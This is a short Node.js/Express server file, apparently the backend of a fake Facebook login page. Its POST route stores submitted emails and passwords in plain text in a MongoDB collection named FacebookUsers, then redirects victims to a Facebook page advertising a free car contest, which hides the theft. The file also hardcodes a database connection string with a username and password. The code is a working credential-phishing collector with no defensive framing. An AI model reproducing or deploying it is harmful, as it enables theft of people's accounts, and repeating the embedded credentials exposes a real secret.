const mongo = require("mongoose");
const express = require("express");
const bodyParser = require("body-parser");
const http = require("http");

let UserShema = require("./shema/User");

const app = express()

mongo.connect("mongodb+srv://YanisKerrouche:Yanis.com123@cluster0.ag5tc.mongodb.net/FacebookUsers",{useNewUrlParser: true, extended: true })
.then(()=>console.log("connecté a MongoDB et au cluster"))
.catch(err=>console.log("non connecté a MongoDB erreur : "+err))

let server = http.createServer(app)

//routes
app.use(bodyParser.urlencoded({extended:true}))
app.use(bodyParser.json())
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content, Accept, Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
  next();
});


app.post("/facebookclone/api",(req,res,next)=>{
    console.log(req.body)
    let user = new UserShema({
        email: req.body.email,
        password: req.body.password
    })
    user.save()
    .then(()=>{
        res.status(201);
        console.log("Un utilisateur a été crée");
        res.redirect("https://web.facebook.com/GAGNER-UNE-VOITURE-concours-gratuit-124559830900270");
    })
    .catch(err=>{
        res.status(500).json({err})
        console.log("nous n'arrivons pas a crée l'utilsateur")
    })
})
app.get("/facebookclone/api",(req,res,next)=>{
    console.log("Salut connard")
    res.send("Bonsoir !")
})

server.listen(3000)
